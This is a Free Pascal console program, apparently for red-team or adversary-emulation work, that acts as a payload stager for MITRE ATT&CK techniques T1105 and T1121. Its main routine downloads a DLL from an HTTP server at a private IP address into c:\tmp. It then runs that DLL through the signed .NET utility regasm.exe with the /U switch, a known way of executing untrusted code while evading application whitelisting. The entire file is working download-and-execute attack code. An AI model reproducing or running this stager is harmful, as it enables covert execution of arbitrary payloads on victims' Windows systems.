program project1;

{$mode objfpc}{$H+}

uses
  {$IFDEF UNIX}{$IFDEF UseCThreads}
  cthreads,
  {$ENDIF}{$ENDIF}
  Classes, SysUtils, CustApp,process,FPHttpClient
  { you can add units after this };

type

  { Tstager }

  Tstager = class(TCustomApplication)
  protected
    procedure DoRun; override;
  public
    constructor Create(TheOwner: TComponent); override;
    destructor Destroy; override;
    procedure WriteHelp; virtual;
    procedure T1121;virtual;
  end;

{ Tstager }

procedure Tstager.DoRun;
var
  ErrorMsg: String;
begin
  // parse parameters
  if HasOption('h', 'help') then begin
    WriteHelp;
    Terminate;
    Exit;
  end;

  { add your program here }
   T1121;
  // stop program loop
  Terminate;
end;

constructor Tstager.Create(TheOwner: TComponent);
begin
  inherited Create(TheOwner);
  StopOnException:=True;
end;

destructor Tstager.Destroy;
begin
  inherited Destroy;
end;
function downloadfile(url:string;filename:string):string;
var
  Client: TFPHttpClient;
  FS: TStream;
  SL: TStringList;
begin
  { SSL initialization has to be done by hand here }
  // {https://attack.mitre.org/techniques/T1105/}
  //InitSSLInterface;
  Client := TFPHttpClient.Create(nil);
  FS := TFileStream.Create(Filename,fmCreate or fmOpenWrite);
  try
    try
      { Allow redirections }
     // Client.AllowRedirect := true;
      Client.Get(url,FS);

    except
      on E: EHttpClient do
        writeln(E.Message)
      else
        raise;
    end;
  finally
    FS.Free;
    Client.Free;
  end;
  end;
procedure Tstager.T1121;
var
  cmd:string;
  outp:string;
begin
  //here we can do downloader function to download file into tmp folder  {https://attack.mitre.org/techniques/T1105/}
  // then we call executing function for that
downloadfile('http://192.168.1.40/regsvcs.dll','c:\tmp\regsvcs.dll');
 cmd := 'c:\tmp\regsvcs.dll';
 writeln('[+] RegAsm / Regsvcs Mitre Technique T1121');
 Writeln('[+] .NET Utilities Stager ');
 runcommand('C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe',['/U',cmd],outp);
 writeln(outp);

end;

procedure Tstager.WriteHelp;
begin
  { add your help code here }
  writeln('Usage: ', ExeName, ' -h');
end;

var
  Application: Tstager;
begin
  Application:=Tstager.Create(nil);
  Application.Title:='T1121';
  Application.Run;
  Application.Free;
end.

